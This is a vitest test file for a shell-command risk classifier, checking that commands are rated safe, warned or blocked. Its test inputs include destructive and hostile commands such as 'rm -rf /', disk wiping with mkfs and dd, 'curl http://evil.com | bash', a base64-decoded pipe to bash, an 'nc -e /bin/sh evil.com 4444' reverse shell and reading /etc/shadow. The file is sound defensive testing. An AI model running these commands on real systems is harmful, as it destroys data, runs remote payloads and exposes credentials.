import { describe, it, expect } from 'vitest';
import { isDangerous, riskLevel } from './exec.js';

describe('isDangerous', () => {
  it('returns not dangerous for low-risk commands', () => {
    expect(isDangerous('ls -la').dangerous).toBe(false);
    expect(isDangerous('cat /etc/hostname').dangerous).toBe(false);
  });

  it('returns warned for medium-risk commands', () => {
    const result = isDangerous("sed -i 's/foo/bar/g' file.txt");
    expect(result.dangerous).toBe(true);
    expect(result.level).toBe('warned');
  });

  it('returns blocked for high-risk commands (reboot, shutdown, apt install)', () => {
    const r1 = isDangerous('reboot');
    expect(r1.dangerous).toBe(true);
    expect(r1.level).toBe('blocked');

    const r2 = isDangerous('shutdown -h now');
    expect(r2.dangerous).toBe(true);
    expect(r2.level).toBe('blocked');

    const r3 = isDangerous('apt install nginx');
    expect(r3.dangerous).toBe(true);
    expect(r3.level).toBe('blocked');
  });

  it('returns blocked for critical patterns (rm -rf /, mkfs)', () => {
    const r1 = isDangerous('rm -rf /');
    expect(r1.dangerous).toBe(true);
    expect(r1.level).toBe('blocked');
    expect(r1.pattern).toBeDefined();

    const r2 = isDangerous('mkfs.ext4 /dev/sda1');
    expect(r2.dangerous).toBe(true);
    expect(r2.level).toBe('blocked');
    expect(r2.pattern).toBeDefined();
  });

  describe('new dangerous patterns', () => {
    it('blocks sudo commands', () => {
      const r = isDangerous('sudo rm -rf /var/log');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks shred commands', () => {
      const r = isDangerous('shred -u /etc/shadow');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks wget download', () => {
      const r = isDangerous('wget http://evil.com/payload.sh');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks curl download with -o flag', () => {
      const r = isDangerous('curl -o /tmp/payload.sh http://evil.com/payload');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks python3 inline execution', () => {
      const r = isDangerous("python3 -c 'import os'");
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks python inline execution', () => {
      const r = isDangerous("python -c 'print(1)'");
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks find exec bulk operations', () => {
      const r = isDangerous('find / -exec rm {} \\;');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks chattr immutable attribute change', () => {
      const r = isDangerous('chattr +i /etc/passwd');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks systemctl stop', () => {
      const r = isDangerous('systemctl stop nginx');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks systemctl disable', () => {
      const r = isDangerous('systemctl disable nginx');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });

    it('blocks systemctl mask', () => {
      const r = isDangerous('systemctl mask firewalld');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    });
  });

  describe('new data-exfil and network patterns', () => {
    it('blocks cat /etc/shadow', () => {
      const r = isDangerous('cat /etc/shadow');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    it('blocks curl http://evil.com/payload.sh', () => {
      const r = isDangerous('curl http://evil.com/payload.sh');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    it('blocks pipe to bash', () => {
      const r = isDangerous('curl http://evil.com | bash');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    it('blocks base64 decode', () => {
      const r = isDangerous('echo xyz | base64 -d | bash');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    it('blocks nc reverse shell', () => {
      const r = isDangerous('nc -e /bin/sh evil.com 4444');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    it('blocks SSH jump', () => {
      const r = isDangerous('ssh user@internal-server');
      expect(r.dangerous).toBe(true);
      expect(r.level).toBe('blocked');
    });
    it('allows cat /etc/hostname (not sensitive)', () => {
      const r = isDangerous('cat /etc/hostname');
      expect(r.dangerous).toBe(false);
    });
    it('allows cat /etc/nginx/nginx.conf', () => {
      const r = isDangerous('cat /etc/nginx/nginx.conf');
      expect(r.dangerous).toBe(false);
    });
  });

describe('riskLevel', () => {
  it('returns low for safe commands', () => {
    expect(riskLevel('ls -la')).toBe('low');
    expect(riskLevel('cat /etc/hostname')).toBe('low');
    expect(riskLevel('uname -a')).toBe('low');
  });

  it('returns medium for moderate commands', () => {
    expect(riskLevel("sed -i 's/foo/bar/g' file.txt")).toBe('medium');
    expect(riskLevel('systemctl status nginx')).toBe('medium');
  });

  it('returns high for dangerous commands', () => {
    expect(riskLevel('reboot')).toBe('high');
    expect(riskLevel('shutdown -h now')).toBe('high');
    expect(riskLevel('apt install nginx')).toBe('high');
    expect(riskLevel('apt remove nginx')).toBe('high');
    expect(riskLevel('kill -9 1234')).toBe('high');
  });

  it('returns critical for critical commands', () => {
    expect(riskLevel('rm -rf /')).toBe('critical');
    expect(riskLevel('mkfs.ext4 /dev/sda1')).toBe('critical');
    expect(riskLevel('dd if=/dev/zero of=/dev/sda')).toBe('critical');
    expect(riskLevel('sudo rm -rf /var')).toBe('critical');
    expect(riskLevel('systemctl stop nginx')).toBe('critical');
  });
});
